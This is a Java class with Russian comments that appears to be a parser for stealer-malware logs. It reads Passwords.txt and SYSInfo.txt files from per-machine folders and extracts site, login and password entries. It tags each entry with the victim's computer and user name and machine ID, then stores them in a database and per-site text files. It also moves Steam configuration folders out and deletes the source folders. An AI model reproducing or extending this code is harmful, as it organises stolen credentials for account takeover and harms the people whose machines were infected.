import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 * Класс для обработки данных
 * Created by knyazev.v on 26.10.2017.
 */
class Manager {
    private String filePath;// Путь к ресурсам
    private String dirResult;// Путь к результатам работы
    private HashMap<String, ArrayList<LogPass>> arrayLogPasses;
    private String url;
    private String appName;
    private String login;
    private String pass;
    private int count = 0;

    Manager() {
        arrayLogPasses = new HashMap<>();
        url     = "";
        appName = "";
        login   = "";
        pass    = "";
    }

    public int getCount() {
        return count;
    }

    /**
     * обработать данные по указанному пути
     * @param filePath - Путь с ресурсами
     */
    public void processData(String filePath){
        File file = new File(filePath);
        StringBuilder s = new StringBuilder();
        if (file.isFile()){
            if (file.getName().equals("SYSInfo.txt")){
                for (Map.Entry<String, ArrayList<LogPass>> entry: arrayLogPasses.entrySet()){
                      writResultToDB(entry.getKey(),entry.getValue(),findUserCompName(file),findMachineID(file));
                }
            }else if (file.getName().equals("Passwords.txt")){
                // Обработать файл
                arrayLogPasses = new HashMap<>();
                arrayLogPasses = processFile(file);
                System.out.println("Обработан: "+file.getAbsoluteFile());
                count++;
            }

        }else {
            // Обработать директори
            processDir(file);
        }
    }

    private String findUserCompName(File file) {
        try (FileInputStream stream = new FileInputStream(file)){
            BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
            String strLine;
            while ((strLine = reader.readLine()) != null){
                //находим индекс первого вхождения символа ":" в подстроке
                int pos = strLine.indexOf(":");
                if (pos> -1){
                    //вычленяем имя атрибута из подстроки
                    String attributeName= strLine.substring(0,pos);
                    //вычленяем значение атрибута
                    String value = strLine.substring(pos+1,strLine.length());
                    //вывод на экран вычлененных значений в нужном нам формате.
                    attributeName = attributeName.trim();
                    if (attributeName.equals("Comp(User)")) {
                        return value.trim();
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }
    /**
     * Запишим рещультат в файл
     */
    private void writResultToFile(String urlPath, ArrayList<LogPass> logPasses, String compUser, String machineID){
        String fileWrite;
        String[] domains = {".com",
                            ".net",
                            ".ru",
                            ".cc",
                            ".org"};
        String newSrt = urlPath;
        for (String domain : domains) {
            int index = newSrt.indexOf(domain);
            if (index != -1) {
                newSrt = newSrt.substring(0,index);
                break;
            }
        }
        newSrt          = newSrt.replace("http://", "");
        newSrt          = newSrt.replace("pop3://", "");
        newSrt          = newSrt.replace("https://","");
        newSrt          = newSrt.replace("/", "_");
        newSrt          = newSrt.replace(":", " ");
        newSrt          = newSrt.replace("?", "");
        newSrt          = newSrt.replace("www","");
        newSrt          = newSrt.replace(".", " ");
        if (newSrt.equals("")) newSrt = "нет_хоста";
        fileWrite = dirResult + "\\" + newSrt + ".txt";
        File file = new File(fileWrite);
        boolean newFile = false;
        if (file.exists()) newFile = true;

        try (FileWriter writer = new FileWriter(file,newFile)){
            DbHandler handler = DbHandler.getInstance();

            if (!newFile){
                writer.append(urlPath+
                        "\r\n========================================\r\n");
            }
            for (LogPass pass:logPasses) {
                pass.setUser(compUser);
                pass.setMachineID(machineID);
                String str = "\r\nURL:"    + pass.getUrl() +
                        "\r\nComp(User): "  + compUser +
                        "\r\nLogin: "       + pass.getLogin() +
                        "\r\nPassword: "    + pass.getPassword() +
                        "\r\n";//****************************************\r\n";
                writer.append(str);
                handler.addLogPass(pass);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } catch (SQLException e) {
            e.printStackTrace();
        }

    }

    /**
     * Запишим рещультат в базу данных
     */
    private void writResultToDB(String urlPath, ArrayList<LogPass> logPasses, String compUser, String machineID){

        DbHandler handler = null;
        try {
            handler = DbHandler.getInstance();
            for (LogPass pass:logPasses) {
                pass.setMachineID(machineID);
                pass.setUser(compUser);
                handler.addLogPass(pass);
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }

    }
    /**
     * Обработать файл
     * @param file - файл для анализа
     * @return - массив с результаттми
     */
    private HashMap<String, ArrayList<LogPass>> processFile(File file){
        // Прочитать данные из файла и обработать
        try (FileInputStream stream = new FileInputStream(file)){
            BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
            String strLine;
            while ((strLine = reader.readLine()) != null){
                //находим индекс первого вхождения символа ":" в подстроке
                int pos = strLine.indexOf(":");
                if (pos> -1){
                    //вычленяем имя атрибута из подстроки
                    String attributeName= strLine.substring(0,pos);
                    //вычленяем значение атрибута
                    String value = strLine.substring(pos+1,strLine.length());
                    //вывод на экран вычлененных значений в нужном нам формате.
                    determineKeyValue(attributeName,value);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return arrayLogPasses;
    }

    private void processDir(File file){
        String ext = "SYSInfo.txt,Passwords.txt";
        String[] files  = file.list(new MyFileNameFilter(ext));
        if (files.length > 0) {
            for (String path: files) {
                processData(file +"\\"+path);
            }

            try {
                copyDir(file.getAbsolutePath()+"\\Steam\\Config",getDirResult()+"\\Steam\\"+file.getName());
            } catch (IOException e) {
                e.printStackTrace();
                System.out.println("Не пишет Steam");
            }
            deleteDirectory(file);
        }
        else {
            String[] dirs  = file.list(new MyDirFilter());
            for (String path: dirs) {
                processData(file +"\\"+path);
            }
        }

    }

    private String findMachineID(File file) {
        String machineID = "";
        int index = file.getParent().lastIndexOf("\\");
        if (index != -1) {
            machineID = file.getParent().substring(index+1);
        }
        return machineID;
    }
    /**
     * Deletes directory with subdirs and subfolders
     * @author Cloud
     * @param dir Directory to delete
     */
    private void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            String[] children = dir.list();
            for (int i=0; i<children.length; i++) {
                File f = new File(dir, children[i]);
                deleteDirectory(f);
            }
            dir.delete();
        } else dir.delete();
    }
    private void determineKeyValue(String key, String value) {
        value = value.replace("\t\t", "");
        if (key.equals("SOFT") && !value.isEmpty()){
            this.setAppName(value);
        }else if (key.equals("HOST")||key.equals("Website")&& !value.isEmpty()){
            this.setUrl(value);
        }else if (key.equals("USER")&& !value.isEmpty()){
            this.setLogin(value);
        }else if (key.equals("PASS")&& !value.isEmpty()){
            this.setPass(value);
        }
        createLogPas();
    }

    private void createLogPas(){
        if (!this.getUrl().equals("")&&!this.getPass().equals("")&&!this.getLogin().equals("")){
            LogPass logPass = new LogPass(this.appName,"" ,this.url, this.login, this.pass);
            this.setAppName("");
            this.setUrl("");
            this.setLogin("");
            this.setPass("");

            if (arrayLogPasses.containsKey(logPass.getUrl())){
                arrayLogPasses.get(logPass.getUrl()).add(logPass);
            }else {
                ArrayList<LogPass> logPasses = new ArrayList<>();
                logPasses.add(logPass);
                arrayLogPasses.put(logPass.getUrl(),logPasses);
            }

        }
    }

    // Копирование Steam файлов
    private void copyDir(String sourceDirName, String targetSourceDir) throws IOException {
        File folder = new File(sourceDirName);
        File[] listOfFiles = folder.listFiles();

        if (listOfFiles.length > 0) {
            File newFolder = new File(getDirResult()+"\\Steam");
            if (!newFolder.exists()) {
                newFolder.mkdir();
            }
            Path pathSource = Paths.get(sourceDirName);
            Path pathDestination = Paths.get(targetSourceDir);
            Files.move(pathSource, pathDestination, StandardCopyOption.REPLACE_EXISTING);
        }
    }



    private String getUrl() {
        return url;
    }

    private void setUrl(String url) {
        this.url = url;
    }

    public String getAppName() {
        return appName;
    }

    private void setAppName(String appName) {
        this.appName = appName;
    }

    private String getLogin() {
        return login;
    }

    private void setLogin(String login) {
        this.login = login;
    }

    private String getPass() {
        return pass;
    }

    private void setPass(String pass) {
        this.pass = pass;
    }

    public String getFilePath() {
        return filePath;
    }

    public String getDirResult() {
        return dirResult;
    }

    void setFilePath(String filePath) {
        this.filePath = filePath;
    }
    void setDirResult(String dirResult) {
        this.dirResult = dirResult;
    }


    // Реализация интерфейса FileNameFilter
    class MyFileNameFilter implements FilenameFilter {

        String[] ext;

        public MyFileNameFilter(String ext){
            this.ext = ext.split(",");
        }

        @Override
        public boolean accept(File dir, String name) {
            for (String s : ext) {
                if (name.equals(s)) {
                    return true;
                }
            }
            return false;
        }
    }

    // Реализация интерфейса FileNameFilter
    class MyDirFilter implements FilenameFilter {
        @Override
        public boolean accept(File dir, String name) {
            return dir.isDirectory();
        }
    }
}
